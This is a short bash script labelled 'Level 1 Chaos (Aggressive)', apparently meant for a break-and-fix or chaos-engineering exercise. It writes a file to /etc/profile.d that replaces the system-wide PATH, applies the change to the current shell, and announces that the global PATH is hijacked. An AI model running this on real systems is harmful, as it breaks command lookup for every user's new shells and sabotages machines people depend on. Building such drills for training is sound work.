#!/bin/bash
# Level 1 Chaos (Aggressive)
echo 'export PATH="/usr/libexec:/opt"' >/etc/profile.d/broken_path.sh
chmod +x /etc/profile.d/broken_path.sh
hash -r
export PATH="/usr/libexec:/opt"
echo "[!] Global PATH hijacked. Try opening a new terminal window or running 'ls'."
